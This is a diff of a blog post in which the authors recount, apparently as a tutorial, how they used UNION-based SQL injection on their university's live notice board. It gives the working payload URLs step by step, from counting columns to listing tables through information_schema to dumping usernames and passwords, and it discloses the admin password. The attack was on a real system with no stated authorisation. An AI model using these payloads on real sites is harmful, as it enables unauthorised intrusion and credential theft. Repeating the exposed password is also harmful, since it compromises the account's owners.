@@ -1,15 +1,15 @@
 ---
 layout: post
-title: We hacked our university notice board!
+title: How we hacked our university notice board?
 date: 2014-07-10 06:44:56.000000000 +05:30
 type: post
 published: true
 status: publish
 author: Nagesh Podilapu a.k.a H4rryp0tt3r
-assetID: 5668e0defa143267af983836917cd517
+assetID: 33ed6b071854135c17600a86a1d8876a
 ---
 
-It's been nearly 3 months since my last post. Today I thought "It will be helpful for the guys who are interested in Cyber Security , If I write about UNION Based SQLi that we did on our univeristy Notice board.
+It's been nearly 3 months since my last post. Today I thought It will be helpful for the guys who are interested in Cyber Security, If I write about UNION Based SQLi that we did on our university notice board.
 A little learning part before we jump on to exploitation.
 
 <pre>
@@ -68,15 +68,15 @@ mysql> select username from users where sno=1 and 1=0 UNION select 1;
 +----------+
 </pre>
 
-Good, have a glance at why we started this :-)
+Good, now let's have a glance at why we started this.
 
-After doing brute-force attack on a webpage for getting flag in a [CTF](https://ctftime.org/ctf-wtf/){:target="_blank"}, we thought it would give us admin rights If we can do the same attack on our notice board too. But later we realized that we can't just get the admin password by a filthy brute-force attack.
+After doing brute-force attack on a web page for getting flag in a [CTF][ctf-about-link]{:target="_blank"}, we thought It would give us admin rights If we can do the same attack on our notice board too. But later we realized that we can't just get the admin password by a filthy brute-force attack.
 
-Hmm.. So what now, we noticed that in notice board there is a page `notice_view.php?id=1` which takes `id` as GET parameter.
+So we explored that website a bit and noticed that there is a page `notice_view.php?id=1` which takes `id` as GET parameter.
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/onb.png" description="notice_view.php page" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/onb.png" description="notice_view.php page" %}
 
-And as we are web developers we came to an estimation that the backend MySQL query might be
+As we are web developers we came to an estimation that the backend MySQL query might be
 
 {% highlight text %}
 select * from tablename where somecolumnname=$_GET["id"];
@@ -118,11 +118,11 @@ http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2--
 http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2,3--
 {% endhighlight %}
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/injected.png" description="First Injection point" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/injected.png" description="First Injection point" %}
 
-So the backend query which is fetching notices is selecting 3 columns, but the webpage is displaying only 2 & 3 (So these columns are vulnerable) and anything we inject in those columns that will display the result of that injected query on webpage.
+So the backend query which is fetching notices is selecting 3 columns, but the web page is displaying only 2 & 3 (So these columns are vulnerable) and anything we inject in those columns that will display the result of that injected query on web page.
 
-Cool, so now we can inject a code that will print database name on webpage. There is a MySQL function `database()` which will display the current selected database. So we can use that function in any of the columns 2 (or) 3.
+Cool, so now we can inject a code that will print database name on web page. There is a MySQL function `database()` which will display the current selected database. So we can use that function in any of the columns 2 (or) 3.
 
 {% highlight text %}
 http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,database(),3--
@@ -130,7 +130,7 @@ http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,database(),3-
 
 And result of this query is..
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/database.png" description="Database name being displayed on page" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/database.png" description="Database name being displayed on page" %}
 
 We have the database name `Notices`, now we have to find the table name for that we will use the mysql default Database which stores information of all the databases in it. So we have to extract all the information related to the database `Notices`. In order to do so we have used this payload
 
@@ -142,7 +142,7 @@ where TABLE_SCHEMA='Notices' --
 
 And the result is
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/tables.png" description="Table names being displayed on page" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/tables.png" description="Table names being displayed on page" %}
 
 Now we got all the tables in `Notices` Database and those are `notices, users`. This 'users' table seems interesting and we chose to see the contents of 'users' table first. But before that we should know the columns names of that table, information_schema is our friend now.
 
@@ -152,7 +152,7 @@ select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where
 TABLE_NAME='users' AND TABLE_SCHEMA='Notices'--
 {% endhighlight %}
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/columns.png" description="Column names being displayed on page" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/columns.png" description="Column names being displayed on page" %}
 
 Now we just need to print password column from that table, used below payload.
 
@@ -163,7 +163,7 @@ UNION select 1,group_concat(username,"-",password),3 from users --
 
 Result is...
 
-{% include image.html url="/assets/5668e0defa143267af983836917cd517/passwords.png" description="Passwords being displayed on page" %}
+{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/passwords.png" description="Passwords being displayed on page" %}
 
 Ah! Finally, the admin password is on page and it is: `admin@onb`
 
@@ -172,3 +172,5 @@ And in this post I keep on mentioning we. So we are
 [Nageswara Rao Podilapu (Me)](https://www.facebook.com/H4rryp0tt3r7){:target="_blank"} <br>
 [Anesh Parvatha](https://www.facebook.com/anesh.cse){:target="_blank"} <br>
 [Ambati Bharath](https://www.facebook.com/bharath.hussy){:target="_blank"}
+
+[ctf-about-link]: https://ctftime.org/ctf-wtf/
